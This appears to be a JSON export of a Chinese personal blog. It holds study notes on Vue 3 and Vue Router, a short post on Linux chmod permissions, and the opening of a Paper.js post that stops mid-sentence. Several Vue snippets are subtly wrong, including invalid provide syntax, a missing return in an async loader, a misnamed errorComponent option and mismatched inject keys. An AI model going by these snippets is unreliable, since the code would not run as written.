--&gt;&lt;FancyButton&gt; &lt;span style=&quot;color: red&quot;&gt;Click me!&lt;/span&gt; &lt;AwesomeIcon name=&quot;plus&quot; /&gt;&lt;/FancyButton&gt; 1234&lt;!-- 子组件 FancyButton.vue --&gt;&lt;button class=&quot;fancy-btn&quot;&gt; &lt;slot&gt;&lt;/slot&gt; &lt;!-- 插入的位置 --&gt;&lt;/button&gt; 12345&lt;!-- 最终渲染结果 --&gt;&lt;button class=&quot;fancy-btn&quot;&gt; &lt;span style=&quot;color: red&quot;&gt;Click me!&lt;/span&gt; &lt;AwesomeIcon name=&quot;plus&quot; /&gt;&lt;/button&gt; 作用域：插槽内容可以访问父组件中定义的变量，但无法访问子组件中的数据； 默认内容：插槽允许指定默认内容，这样当父组件没有传入内容时，可显示默认内容；就像默认参数值一样； 12345&lt;button type=&quot;submit&quot;&gt; &lt;slot&gt; Submit &lt;!-- 此处的 Submit 为默认内容 --&gt; &lt;/slot&gt;&lt;/button&gt; 具名插槽组件支持多个插槽，为了避免混淆，需要为每个插槽指定名称，这样传入内容的时候，才能够匹配； 123456789101112&lt;!-- 子组件 BaseLayout.vue --&gt;&lt;div class=&quot;container&quot;&gt; &lt;header&gt; &lt;slot name=&quot;header&quot;&gt;&lt;/slot&gt; &lt;/header&gt; &lt;main&gt; &lt;slot&gt;&lt;/slot&gt; &lt;!-- 没有名称，默认名称为 default --&gt; &lt;/main&gt; &lt;footer&gt; &lt;slot name=&quot;footer&quot;&gt;&lt;/slot&gt; &lt;/footer&gt;&lt;/div&gt; 123456789&lt;!-- 父组件 --&gt;&lt;BaseLayout&gt; &lt;template v-slot=&quot;header&quot;&gt; &lt;!-- 此处的内容将匹配到名称为 header 的插槽上 --&gt; &lt;/template&gt; &lt;template #footer&gt; &lt;!-- v-slot 支持简写为 # --&gt; &lt;!-- 此处的内容将匹配到名称为 footer 的插槽上 --&gt; &lt;/template&gt;&lt;/BaseLayout&gt; 父组件的插槽名称必须和子组件中的插槽名称完全一样，如果不一样，会无法匹配，因此也无法渲染 插槽的名称可以是动态的 123&lt;base-layout&gt; &lt;template v-slot:[dynamicSlotName]&gt;&lt;/template&gt;&lt;/base-layout&gt; 反向传递子组件可以将自己的数据，通过插槽，反向传递给父组件 无渲染组件利用插槽机制，再加上 v-slot 让子组件能够向父组件传递数据，那么接下来便出现了一种有趣的用法，即子组件只封装了逻辑，但没有封装要渲染的内容。它在通过逻辑获得数据后，可以将数据传递给父组件，由父组件自行决定如何渲染； 依赖注入当需要向深层次的组件时，使用 props 会导致逐级透传的问题 Vue 使用 provide&#x2F;inject 机制来解决逐级透传的问题 1234567&lt;script setup&gt; import &#123; provide &#125; from &#x27;vue&#x27;; provide(&#123; &#x27;message&#x27;, &#x27;hello&#x27;&#125;) // 此处 message 是键，hello 是值； const count = ref(0); provide(&#x27;count&#x27;, count); // provide 支持多次调用，以便传入多个值&lt;/script&gt; app 可以提供全局依赖&#x2F;注入 12345import &#123; createApp &#125; from &#x27;vue&#x27;const app = createApp(&#123;&#125;);app.provide(&quot;message&quot;, &quot;hello&quot;); 在子组件中，使用 inject 来获得想要的数据 1234567891011&lt;!-- 子组件 --&gt;&lt;script setup&gt; import &#123; inject &#125; from &#x27;vue&#x27; const message = inject(&quot;message&quot;); // 使用 inject 获得想要的数据 const value = inject(&quot;count&quot;, &quot;defaultValue&quot;) // inject 支持设置一个默认值 // 默认值也可以使用工厂函数来生成, 第三个参数 true 用来声明默认值是由一个函数生成 const value = inject(&quot;key&quot;, () =&gt; new DefautlValue(), true);&lt;/script&gt; 如果需要在子组件中更改注入的数据，那么 provide 最好提供一个方法，供子组件调用，而不是直接修改。这样有利于未来的维护； 1234567891011121314&lt;script setup&gt; import &#123; ref, provide &#125; from &#x27;vue&#x27; const location = ref(&quot;North Pole&quot;); function updateLocation() &#123; location.value = &#x27;South Pole&#x27;; &#125; provide(&quot;location&quot;, &#123; location, updateLocation, &#125;)&lt;/script&gt; 123456789101112&lt;!-- 子组件 --&gt;&lt;script setup&gt; import &#123; inject &#125; from &#x27;vue&#x27; const &#123; location, updateLocation &#125; = inject(&quot;location&quot;); // 可以解包&lt;/script&gt;&lt;template&gt; &lt;button @click=&quot;updateLocation&quot;&gt; &#123;&#123; location &#125;&#125; &lt;/button&gt;&lt;/template&gt; 如果提供方想保护自己的数据不能被修改，可以使用 readonly 将其装饰为只读的状态 1234567&lt;script setup&gt; import &#123; ref, provide, readonly &#125; from &#x27;vue&#x27; const count = ref(0) provide(&#x27;readOnlyCount&#x27;, readonly(count)) // 使用 readonly 装饰&lt;/script&gt; 使用 Symbol 避免命名冲突如果构建的应用很大，或者所编写的组件会被很多人调用，那么有可能产生命名冲突。解决办法就是将名称放在一个单独的文件中统一管理 12// key.jsexport const myInjectKey = Symbol(); // Symbol 会生成一个唯一值，以便作为标识符，避免重名 12345// 在 provide 组件中import &#123; provide &#125; from &#x27;vue&#x27;import &#123; myIndectKey &#125; from &quot;./key.js&quot;provide(myInjectKey, &#123;/* something */&#125;) 12345// 在 inject 组件中import &#123; inject &#125; from &#x27;vue&#x27;import &#123; myInjectKey &#125; from &quot;./key.js&quot;const injected = inject(&quot;myInjectKey&quot;); 异步组件当应用变得很大时，每次打开便加载所有组件将耗费很长的等待时间，更好的做法是懒加载，即等用到某个组件时，再去加载它； 123456789// 普通加截组件的方法import MyComponet from &quot;./components/MyComponent.vue&quot;// 异步加载组件的方法import &#123; defineAsyncComponent &#125; from &#x27;vue&#x27;const AsyncComp = defineAsyncComponent(() =&gt; &#123; import(&quot;./components/MyComponent.vue&quot;)&#125;) 加载错误异步加载因为是使用时再加载的，那么有可能因为网络信号不好，导致加载失败，此时可提供一个组件，来应对出错的情况，defineAsyncComponent 支持多个配置选项 1234567const AsyncComp = defineAsyncComponent(&#123; loader: () =&gt; import(&quot;../components/Foo.vue&quot;), loadingComponent: LoadingComponent, // 例如可显示加载动画 errComponent: ErrorComponent, // 例如在出错时，显示错误提示信息 delay: 200, // 设置延迟，有助于让画面过渡更加顺滑，以免加载太快，切换太快，像是页面闪烁 timeout: 3000, // 超时后报错&#125;) 逻辑复用组合式函数当某个行为逻辑被很多个组件复用时，可以把它抽象到一个公式的函数中，然后由各组件引入使用； 1234567891011121314151617181920212223// 该函数实时读取鼠标的位置，现抽象到单独的 mouse.js 文件中import &#123; ref, onMounted, onUnmounted &#125; from &#x27;vue&#x27;// 按照惯例，组合式函数名以“use”开头export function useMouse() &#123; // 被组合式函数封装和管理的状态 const x = ref(0) const y = ref(0) // 组合式函数可以随时更改其状态。 function update(event) &#123; x.value = event.pageX y.value = event.pageY &#125; // 一个组合式函数也可以挂靠在所属组件的生命周期上 // 来启动和卸载副作用 onMounted(() =&gt; window.addEventListener(&#x27;mousemove&#x27;, update)) onUnmounted(() =&gt; window.removeEventListener(&#x27;mousemove&#x27;, update)) // 通过返回值暴露所管理的状态 return &#123; x, y &#125;&#125; 12345&lt;!-- 在组件中使用 mouse.js --&gt;&lt;Script setup&gt; import &#123; useMouse &#125; from &quot;./mouse.js const &#123; x, y &#125; = useMouse(); // useMouse 会创建单独的实例，因此各个组件间的状态不会相互影响&lt;/Script&gt; 我们可以将动作拆分成更小的函数，然后不同的函数可以相互组合，这样可以尽可能实现复用； 例如从后端获取数据是一个很常见的动作，获取的过程涉及三个动作，显示正在获取中；如果成功，显示数据；如果失败，显示失败提示；由于该动作很常见，因此我们可以将它封装成一个单独的函数，以便各个组件可以复用该逻辑； 123456789101112131415161718192021&lt;!-- 传统的方式 --&gt;&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;const data = ref(null)const error = ref(null)fetch(&#x27;...&#x27;) .then((res) =&gt; res.json()) .then((json) =&gt; (data.value = json)) .catch((err) =&gt; (error.value = err))&lt;/script&gt;&lt;template&gt; &lt;div v-if=&quot;error&quot;&gt;Oops! Error encountered: &#123;&#123; error.message &#125;&#125;&lt;/div&gt; &lt;div v-else-if=&quot;data&quot;&gt; Data loaded: &lt;pre&gt;&#123;&#123; data &#125;&#125;&lt;/pre&gt; &lt;/div&gt; &lt;div v-else&gt;Loading...&lt;/div&gt;&lt;/template&gt; 123456789101112131415// 抽象成单独的函数// fetch.jsimport &#123; ref &#125; from &#x27;vue&#x27;export function useFetch(url) &#123; const data = ref(null) const error = ref(null) fetch(url) .then((res) =&gt; res.json()) .then((json) =&gt; (data.value = json)) .catch((err) =&gt; (error.value = err)) return &#123; data, error &#125;&#125; 123456&lt;!-- 使用封装后的函数 --&gt;&lt;script setup&gt;import &#123; useFetch &#125; from &#x27;./fetch.js&#x27;const &#123; data, error &#125; = useFetch(&#x27;...&#x27;)&lt;/script&gt; 理论上也可以直接使用普通的函数，没有必要将函数封装组装，这种做的好处其实在于让它变成响应式的。因为普通的函数每次执行，都需要手动主动调用。而如果封装成了组件，同时参数为 ref 或者 getter 函数等动态类型，那么每当参数值发生变化时，组件就会自动运行。这是相对普通函数的好处； 123456const url = ref(&#x27;/initial-url&#x27;)const &#123; data, error &#125; = useFetch(url)// 这将会重新触发 fetchurl.value = &#x27;/new-url&#x27; 另外，也可以在函数式组件中使用 watchEffect 来监听参数变化； 123456789101112131415161718192021222324// fetch.jsimport &#123; ref, watchEffect, toValue &#125; from &#x27;vue&#x27;export function useFetch(url) &#123; const data = ref(null) const error = ref(null) const fetchData = () =&gt; &#123; // 每次运行前重置 data.value = null error.value = null fetch(toValue(url)) // toValue 的好处是让参数可以支持多种类型，更加灵活 .then((res) =&gt; res.json()) .then((json) =&gt; (data.value = json)) .catch((err) =&gt; (error.value = err)) &#125; watchEffect(() =&gt; &#123; // 使用 watchEffect 来监听变化 fetchData() &#125;) return &#123; data, error &#125;&#125; 解构重命名 1234567const obj = &#123; a: 1, b: 2, c: 3,&#125;const &#123;a : a1, b : b2, c: c3, d4 = &#x27;default&#x27;&#125; = obj; 自定义指令Vue 有一些内置的指令，例如 v-model、v-show 等，这些指令从本质上来，其实是为了操作和控制 DOM；除了内置指令，Vue 也支持编写自定义的指令，这些指令可以在不同的组件上实现复用； 123456789&lt;script setup&gt;const vFocus = &#123; mounted: (el) =&gt; el.focus(), // 加载后，可自动对焦&#125;&lt;/script&gt;&lt;template&gt; &lt;input v-focus /&gt;&lt;/template&gt; vFocus 是一种强制的命名规范，以小写字母 v 开头； 指令支持多种钩子函数 12345678910111213const myDirective = &#123; created(el, binding, vnode)&#123;&#125;, beforeMount(el, binding, vnode)&#123;&#125;, mounted(el, binding, vnode)&#123;&#125;, beforeUpdated(el, binding, vnode)&#123;&#125;, updated(el, binding, vnode)&#123;&#125;, beforeUnmounted(el, binding, vnode)&#123;&#125; unmounted(el, binding, vnode)&#123;&#125;&#125;// el 参数指要操作的元素// binding 是一个对象，主要用来存放要传给指令的值；以便 el 可以读取这些值，进行相应的操作；// vnode 代表绑定元素的底层 VNode// prevVnode 代表之前绑定的底层 VNode 注：应避免有组件上面使用自定义指令，而是只在原生的 HTML 元素上使用，以避免冲突，产生预期外的效果； 插件插件可用来给 Vue 添加全局功能； 12345import &#123; createApp &#125; from &#x27;vue&#x27;const app = createApp();app.use(myPlugin), &#123;...&#125;; // 全局使用插件 12345678// 定义插件示例const myPlugin = &#123; install: (app, options) &#123;...&#125;,&#125;// 或者const myPlugin = (app, options) =&gt; &#123;&#125; 编写插件示例该插件给在 app 上注册一个全局可用的 $translate 函数，用来翻译指定字段 123456789101112// plugins/i18n.jsexport default &#123; install: (app, options) =&gt; &#123; app.config.globalProperties.$translate = (key) =&gt; &#123; return key.split(&quot;.&quot;).reduce((0, i) =&gt; &#123; if (o) &#123; return o[i]; &#125; &#125;, options); &#125; &#125;&#125; 12345678// 引入插件import i18nPlugin from &quot;./plugins/i18n&quot;;app.use(i18nPlugin, &#123; greetings: &#123; hello: &quot;Bonjour!&quot;, &#125;&#125;) 12&lt;!-- 使用插件 --&gt;&lt;h1&gt;&#123;&#123; $translate(&quot;greetings.hello&quot;)&#125;&#125;&lt;/h1&gt; 插件中也可以引入 provide &#x2F; inject，这样各个组件就可以直接读取插件提供的值了 12345export default &#123; install: (app, options) =&gt; &#123; app.provide(&#x27;i18n&#x27;, options), &#125;&#125; 123456&lt;!-- 在组件中通过 inject 读取 options --&gt;&lt;script setup&gt; import &#123; inject &#125; from &#x27;vue&#x27;; const i18n = inject(&#x27;i18n&#x27;); console.log(i18n.greetings.hello);&lt;/script&gt; 内置组件Transition内置的 Transition 组件，可用来给组件加载或卸载时提供动画效果； 1234&lt;button @click=&quot;show =!show&quot;&gt;Toggle&lt;/button&gt;&lt;Transition&gt; &lt;p v-if=&quot;show&quot;&gt;hello&lt;/p&gt;&lt;/Transition&gt; 动画效果可以自定义，并且可以命名，以方便管理多种不同的动画效果； TransitionGroup 可用来设置列表的动画，当列表添加或删除元素时，呈现动画效果； KeepAliveKeepAlive 可用来缓存实例 TeleportTeleport 有点像是一个传送门，用来将组件中的部分模板，传送到外部组件上面；之所以这么做，是为了能够更好的展示传送的内容，避免受到深层嵌套过程中的其他组件的布局影响； 12345678&lt;button @click=&quot;open = true&quot;&gt;Open Modal&lt;/button&gt;&lt;Teleport to=&quot;body&quot;&gt; &lt;div v-if=&quot;open&quot; class=&quot;model&quot;&gt; &lt;p&gt;Hello from the modal&lt;/p&gt; &lt;button @click=&quot;open = false&quot;&gt;Close&lt;/button&gt; &lt;/div&gt;&lt;/Teleport&gt; Teleport 会改变 DOM 的层级关系，但不会改组件之间的层级关系； Suspence在某个组件内部存在多个异步组件时，有可能这些异步组件都有自己的异步处理机制，例如显示加载图标。当这些子组件同时加载时，会导致页面上出现多个异步图标。Suspence 的目标是对这些异步状态统一管理，展示统一的加载状态； 应用规模化单文件组件一个 Vue 文件同时包含 js、html 和 css 三部分内容，即同时包含逻辑、模板和样式数据； 单文件组件是一种代码的组织方式，如果需要实现的功能非常小，例如只是给静态文件添加一些简单的交互，则可以考虑使用 petite-vue，只有 6k 大小； 路由非常简单的页面，可用 computed 配合监听浏览器的 haschange 来切面页面；它的原理很简单，即 js 代码调用浏览器的接口，更新了 url，触发了 haschange 事件，从而调用监听函数，完成组件的更新，实现页面的切换； 正式的路由器则使用 Vue Router 状态管理如果多个组件依赖同一份数据，那么使用 props 逐级透传的方式，会让代码变得臃肿。解决办法是将数据封装成一个全局的单例，供各个组件使用； 其中一个方案是使用 reactive、ref、computed 或者组合式函数，创建一个响应式对象，放在单独的文件中，供各个组件引用； 如果应用使用服务器渲染，则以上方案变得不太可行；此时需要使用单独的状态管理器，例如 Pinia 或者 Vuex； 测试需要测试的东西： 单元测试：确保函数正常 组件测试：确保 component 的功能正常 端到端测试：类似于集合测试，确保整个应用正常运行；常用框架：Cypress，Playwright，Nightwatch 等； 其中端到端是最重要的，因为它确保了应用程序的运行正常； 服务端渲染有两种场景需要用到服务端渲染 SSR： SEO 非常重要； 首页加载速度非常重要； 最佳实践生产部署在生产服务器部署，那些提高开发效率的工具就不需要了，因此记得在打包代码是地，排除它们，以缩小文件的体积； 性能优化Vue 本身包含了优化功能，在绝大部分场景下，vue 的性能都是够用的，除非遇到一些极端的场景，才需要手动优化； 两个常见的优化指标： 页面加载速度 页面更新速度 页面加载优化常用的手段包括： 服务端渲染 减小包体积：例如构建工具使用 Tree Shaking，预编译等，避免引入太大的依赖； 代码分割：实现懒加载； 页面更新优化当 props 变更时，会触发组件的更新，因此，在设计组件时，应该确保它的 props 值尽量稳定，以减少不必要的更新触发； v-once 指令可用来标识无需更新的组件，这样进行更新计算时，会跳过该组件； v-memo 指令可用来设置更新的条件； computed 的计算结果如果发生变化，也会触发更新。 如果是值还好说，可直接比较；如果比较的是对象，那么即使值没有变化，也会触发更新；此时可考虑引入自定义的比较函数； 通用优化 大型列表的虚拟化； 绕开深层级对象的深度检查； 在大型列表中，减少不必要的组件抽象； 进阶使用 Vue 的多种方式 独立脚本，像引入 jQuery 一样轻量化使用； 作为 Web Component 嵌入原有的旧应用； 单页面应用：主流用法； 全栈 &#x2F; SSR：适用于 SEO 很重要的场景； 静态 SSG：静态站点生成 JAMStack，作用静态文件部署；","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"Vue Router 基本用法","slug":"Vue Router 基本用法","date":"2023-08-18T12:26:00.000Z","updated":"2024-09-21T23:19:05.606Z","comments":true,"path":"2023/08/18/Vue Router 基本用法/","permalink":"http://example.com/2023/08/18/Vue%20Router%20%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/","excerpt":"","text":"基础入门路由的目的是建立 url 和组件之间的映射关系；当 url 发生变化时，组件也随之更新； 创建路由器实例1234567891011121314import &#123; createMemoryHistory, createRouter &#125; from &quot;vue-router&quot;import HomeView from &#x27;./HomeView.vue&#x27;import AboutView from &#x27;./AboutView.vue&#x27;const routes = [ &#123; path: &#x27;/&#x27;, component: Homeview &#125;, &#123; path: &#x27;/about&#x27;, component: AboutView &#125;,]const router = createRouter(&#123; history: createMemoryHistory(), routes,&#125;) history 用来记录 url 和路由的双向映射，这里用的是 createMemoryHistory，它会抛开浏览器的 url，完全自我管理； 如果想要跟浏览器的 url 保持关系，则可使用 createWebHistory 或者 createWebhashHistory； 注册路由器插件创建好路由器实例化，可以用 app.use(router) 将其注册为插件； 123const app = createApp();app.use(router);app.mount(&quot;#app&quot;) 注册该插件后，会完成以下几项工作： 注册需要的组件，如 RouterLink 和 RouterView 添加全局属性，如 $router 和 $route 添加全局组合式函数 useRouter 和 useRoute 解析初始路由 访问路由器和当前路由在组合式 API 中，可使用 useRouter 和 useRoute 来访问路由器和当前路由； 动态路由匹配动态匹配：用于将多个路径匹配到同一个组件 123456import User from &quot;./User.vue&quot;const routers = &#123; // 动态参数使用冒号 : 来标识 &#123; path: &quot;/users/:id&quot;, component: User &#125;,&#125; 可在模板中使用 $route 或者 useRoute 来访问当前路径的参数，例如 $route.params.id 12345&lt;template&gt; &lt;div&gt; User &#123;&#123; $route.params.id &#125;&#125; &lt;/div&gt;&lt;/template&gt; 路由支持多个参数，例如 &#x2F;users&#x2F;:name&#x2F;posts&#x2F;:postId 响应路由参数的变化当路由参数出现变化时，为提高性能，避免重新渲染，会直接复用原先的组件。这意味着组件不会重新创建，因此跟创建有关的 hook 函数例如 onMount 也不会重新执行； 可使用 watch 或者 onBeforeRouteUpdated 来监听变化，并执行相关的操作； 12345678&lt;script setup&gt; import &#123; watch &#125; from &#x27;vue&#x27; import &#123; useRoute &#125; from &#x27;vue-router&#x27; const route = useRoute() watch(() =&gt; route.params.id, (newId, oldId) =&gt; &#123;...&#125;)&lt;/script&gt; 1234567&lt;script setup&gt; import &#123; onBeforeRouteUpdated &#125; from &#x27;vue-router&#x27; onBeforeRouteUpdated(async(to, from) =&gt; &#123; userData.value = await fetchUser(to.params.id); &#125;)&lt;/script&gt; 捕获所有路由通过路径参数的正则表达式，可以匹配任意的路由 1234const routes = [ &#123; path: &#x27;/:pathMatch(.*)*&#x27;, name: &#x27;NotFound&#x27;, component: NotFound&#125;, &#123; path: &#x27;/user-:afteruser(.*)&#x27;, component: UserGeneric &#125;,] 路由的匹配语法在参数中自定义正则当两个路径的前缀相同，只是参数的类型不同时，可使用正则来区分它们； 12345const routes = [ // 仅匹配数字 &#123; path: &#x27;/:orderId(\\\\d+)&#x27; &#125;, &#123; path: &#x27;/:productName&#x27; &#125;] 但我个人觉得更好的做法是修改前缀，这样更简单清晰 1234const routes = [ &#123; path: &#x27;/order/:orderId&#x27; &#125;, &#123; path: &#x27;/product/:name&#x27; &#125;,] 可重复的参数星号 * 表示 0 个或多个 加号 + 表示 1 个或多个 123456const routes = [ // 匹配 /one, /one/two, /one/two/three &#123; path: &#x27;/:chapters+&#x27; &#125;, // 匹配 /, /one, /one/two 等 &#123; path: &#x27;/:chapters*&#x27;&#125;] Sensitive 与 Strict 路由配置默认情况下，路由是不区分大小写的，如需要区分，可添加 sensitive: true 和 strict: true 选项 可选参数修饰符 ? 可用来标记可选参数，即 0 个或者 1 个； 123456const routes = [ // 匹配 /users 和 /users/abc &#123; path: &#x27;/users/:userId?&#x27; &#125;, // 匹配 /users 和 /users/123 &#123; path: &#x27;/users/:userId(\\\\d+)&#x27; &#125;] 嵌套路由组件通常是嵌套的，这种嵌套关系也可以反映在 URL 上面。此时，可在路由中配置 children 子路由来标记这种嵌套关系 1234567891011121314151617181920212223const routes = [ &#123; path: &#x27;/user/:userId&#x27;, component: User, children: [ &#123; // 匹配 /user/:id/profile path: &#x27;profile&#x27;, component: UserProfile &#125;, &#123; // 匹配 /user/:id/posts path: &quot;posts&quot;, component: &quot;UserPosts&quot; &#125;, &#123; // 匹配 /user/:id path: &quot;&quot;, component: UserHome &#125; ] &#125;] 命名路由路由支持命名，只需将名称备注在 name 字段中即可； 1234567const routes = [ &#123; path: &quot;/user/:username&quot;, name: &#x27;profile&#x27;, component: User &#125;] 该名称可用于 router-link 中 1&lt;router-link :to=&quot;&#123; name: &#x27;profile&#x27; params: &#123; username: &#x27;erina&#x27; &#125; &#125;&quot;&gt;&lt;/router-link&gt; 建议使用命名路由，一来这样更方便维护，避免后续因为更改路径，导致很多地方需要跟着改动；二来好的名称也比路径也更容易理解； 路由的命名需要全局唯一，不然会出现冲突； 编程式导航导航到不同的位置router.push(…) 会跳转到新的页面，它同时会向页面 history 的栈中添加记录，这样当用户点击浏览器上面的按钮时，就会返回上一页； 点击 router-link 组件也会有相同的效果； 1&lt;router-link :to=&quot;...&quot;&gt;&lt;/router-link&gt; router.push 可以支持很多种格式，其参数可以是简单的 url，也可以是一个对象； 1234567891011121314// 字符串路径router.push(&#x27;/users/eduardo&#x27;)// 带有路径的对象router.push(&#123; path: &#x27;/users/eduardo&#x27; &#125;)// 命名的路由，并加上参数，让路由建立 urlrouter.push(&#123; name: &#x27;user&#x27;, params: &#123; username: &#x27;eduardo&#x27; &#125; &#125;)// 带查询参数，结果是 /register?plan=privaterouter.push(&#123; path: &#x27;/register&#x27;, query: &#123; plan: &#x27;private&#x27; &#125; &#125;)// 带 hash，结果是 /about#teamrouter.push(&#123; path: &#x27;/about&#x27;, hash: &#x27;#team&#x27; &#125;) 替换当前位置router.replace 会跳转新页面，作用与 router.push 相同，区别是直接替换当前路由在 history 中的位置，而不是 push； 横跨历史在 history 栈中进行跳转，类似 window.history.go(n) 1234router.go(1) // 前进1页，与 router.forward 作用相同router.go(-1) // 后退1页，与 router.back 作用相同router.go(3) // 前进3页router.go(-3) // 后退3页 命名视图给视图进行命名，可以让它们同时同级展示，而不是嵌套展示 123&lt;router-view name=&quot;leftSidebar&quot; /&gt;&lt;router-view /&gt; &lt;!-- 没有名称，默认为 default --&gt;&lt;router-view name=&quot;rightSidebar&quot; /&gt; 当页面上存在多个视图时，需要给各视图映射相应的组件； 12345678910111213const router = (&#123; history: createWebHashHistory(), routes: [ &#123; path: &quot;/&quot;, components: &#123; default: Home, leftSidebar: LeftSidebar, rightSidebar: RightSidebar, &#125; &#125; ]&#125;) 命名视图也是支持嵌套滴； 重定向和别名重定向重写向：点击 A 路径，重定向跳转到 B 路径 12345678910111213141516171819// 可以是 urlconst routes = [&#123; path: &quot;/home&quot;, redirect: &quot;/&quot; &#125;]// 或者一个对象const routes = [ &#123; path: &quot;/home&quot;, redirect: &#123; name: &quot;homepage&quot; &#125; &#125;]// 或者一个函数const routes = [ &#123; path: &#x27;/search/:searchText&#x27;, redirect: to =&gt; &#123; return &#123; path: &#x27;/search&#x27;, query: &#123; q: to.params.searchText &#125; &#125; &#125; &#125;] 相对重定向12345678const routes = [ &#123; path: &#x27;/users/:userId/posts&#x27;, redirect: to =&gt; &#123; return &#x27;profile&#x27; // 实际结果为 /users/:userId/profile &#125; &#125;] 别名通过别名，可将任意指定的 url 匹配到相应的组件，而不会受到嵌套结构的限制； 路由组件传参如果在组件中读取 $route 的参数，那么意味着使用该组件，将会与 url 强绑定；组件的复用范围受到了很大的限制；解决方法就是不使用 $route，而是给组件传递参数； 123456&lt;!-- 传统的写法，组件与url紧密耦合 --&gt;&lt;template&gt; &lt;div&gt; User &#123;&#123; $route.params.id&#125;&#125; &lt;/div&gt;&lt;/template&gt; 123456789101112&lt;!-- 新的写法, id 引用 props，由外部传入，而不是读取路由 --&gt;&lt;script setup&gt;defineProps(&#123; id: String, // 声明 props 参数&#125;)&lt;/script&gt;&lt;template&gt; &lt;div&gt; User &#123;&#123; id &#125;&#125; &lt;/div&gt;&lt;/template&gt; 1234// 在路由配置中，通过 props:true 选项将 params 声明为 propsconst routes = [ &#123; path: &quot;/user/:id&quot;, component: User, props: true &#125;] 如果路由映射了多个命名视图，那么需要为每个视图单独备注是否启用 props 12345678910const routes = [ &#123; path: &quot;/user/:id&quot;, components: &#123; default: User, sidebar: Sidebar &#125;, props: &#123; default: true, // 启用 sidebar: false, // 不启用 &#125; &#125;] 另外 props 还支持对象或函数类型； 匹配当前路由的链接有时候多个 router-link 在页面上面会以列表的形式出现，此时经常用不同的颜色，来标识当前激活的 link； 此时需要有一个方法来判断当前处于激活状态的是哪个链接； 不同的历史记录模式有三种历史模式 Hash 模式：会在 URL 上面添加 # 符号，好处是用户重新刷新页面也不要紧，能够正常处理； HTML 模式：URL 跟普通网页的 URL 一模一样，缺点当用户刷新时，会向服务器发送页面请求，需要服务器有相应的处理，不然会出现 404 Memory 模式：URL 只保存在内存，不在浏览器的 URL 上面体现，缺点是无法使用浏览器的前进和后退，因为没有页面栈；","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"Linux 文件权限","slug":"Linux 文件权限","date":"2023-08-04T02:09:00.000Z","updated":"2024-09-21T23:16:23.254Z","comments":true,"path":"2023/08/04/Linux 文件权限/","permalink":"http://example.com/2023/08/04/Linux%20%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/","excerpt":"","text":"drwxrwxrwx d 表示目录 剩下的三组 rwx 分别表示拥有者、拥有者用户组、其他用户对当前文件夹的权限情况 添加权限使用加号 + 减少权限使用减号 - 12345678chmod g+rwx,u+w,o+x &lt;file&gt;# 以上命令的意思是# g+rwx，为用户组增加 rwx 权限# u+w，为用户增加 w 权限# o+x，为其他用户增加 x 权限chmod a-rwx &lt;file&gt;# a 表示所有三个分组（即拥有者、用户组、其他用户），都取消 rwx 权限 rwx 除了用字母外，也可以用数字来表示，rwx 对应的数字分别是 4、2、1 rwxrwxrwx 可以用 777 来表示，因为 rwx 三个数字相加，刚好等于 7，有三组的 rwx，因此有 3 个 7 rwx—— 可以用 700 来表示 r—w—x 可以用 421 来表示 rw-rw-r-x 可以用 665 来表示 本质上来说，数字只是对字母的一种缩写，一种快捷方式，但它也增加了理解的成本； 如果要将 chmod 运用于所用子目录，可以添加 -R 参数，示例如下： 1chmod -R 777 &lt;file&gt;","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"Paperjs","slug":"Paperjs","date":"2023-07-30T03:49:00.000Z","updated":"2024-09-21T23:17:55.624Z","comments":true,"path":"2023/07/30/Paperjs/","permalink":"http://example.com/2023/07/30/Paperjs/","excerpt":"","text":"Paperjs 是一个较流行的 canvas 接口封装库，可以很方便的用来实现绘图功能，基本概念如下： GeometryPoint, Size, RectanglePoint：点，本质上是点的属性描述 123var myPt = new Point(10, 20) // 10,20 分别表示 x,y 坐标// 除了用 X,Y 参数实例化一个点之外，还可以通过传入其他点作为参数来实例化（本质上是复制，彼此后续的改变是独立的，不会相互影响）// 另外也可以调用旧点的 clone() 方法来实现复制 Size：尺寸，用来表示宽度和高度 12var mySize = new Size(10, 20); // 表示宽度 width 为 10, 高度 height 为 20console.log(mySize); // &#123; width: 0, height: 0 &#125; Rectangle：矩形，有多种实例化的方法（这些方法让我发现，其背后的实现原理很可能是使用数组来存储参数） 1234567891011var myPt = new Point(10, 20);var mySz = new Size(100, 200);var myRect = new Rectangle(myPt, mySz);// 或者var myRect = new Rectangle(10, 20, 100, 200);// 或者var myRect = new Rectangle();myRect.point = new Point(10, 20);myRect.size = new Size(100, 200); Vector矢量是一个非常好用的东西，原因： 它不表示绝对坐标值，而是表示从起点到终点的相对坐标值； 相对坐标的特性，让矢量可以很方便用来做各种计算； 两个矢量可以相加，也可以相减，在几何层面，它们其实仅是方向的区别； 矢量与整数的乘法或除法，也很简单，即相对坐标放大或缩小指定的整数倍数，或者也可以理解为在极坐标中，不改变角度，仅改变矢量长度； 1var newVec = oldVec * 3 // 整数必须写在右边，因为 javascript 解释器默认取左边变量的类型作为计算结果的类型 除了乘法外，也可以通过改变矢量的 length，实现相同的效果 1234var newVec = oldVec * 3// 跟下面的算法等价newVec.length = oldVec.length * 3 矢量拥有角度 angle 属性，可以直接赋值，也可以对其进行计算 1234567var vec = new Vector(100, 100);console.log(vec.angle); // 45// 直接赋值vec.angle = 135;// 或者vec.angle = vec.angle + 90; 加减乘除、旋转等计算并不会改变旧的 vector 属性，而是会直接返回一个新的 vector；但当我们直接修改 vector 的属性时，则会改变 vector 的属性值； Path1234567891011var myPath = new Path();// 顺序添加新的点myPath.add(new Point(0, 0)); myPath.add(new Point(100, 50));// 支持一次添加多个点，只需传入多个参数即可myPath.add(new Point(0, 0), new Point(100, 50)); // 支持在现有点之间插入新点myPath.insert(1, new Point(30, 50)); 12345678910111213141516171819// path 有一个 smooth 